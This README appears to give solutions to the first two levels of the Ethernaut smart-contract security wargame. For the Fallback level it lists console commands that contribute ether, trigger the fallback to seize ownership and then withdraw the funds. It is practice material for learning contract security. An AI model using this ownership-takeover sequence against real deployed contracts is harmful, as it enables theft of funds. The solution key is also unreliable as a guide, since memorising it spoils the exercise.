# ethernaut-solutions
Solutions for Ethernaut.



### Hello Ethernaut

```
contract.authenticate("ethernaut0")
```

### Fallback
```
contract.contribute({value:toWei('0.0001')})
sendTransaction({to: instance, from: ethereum.selectedAddress, value: toWei('0.0001')})
contract.withdraw()
```

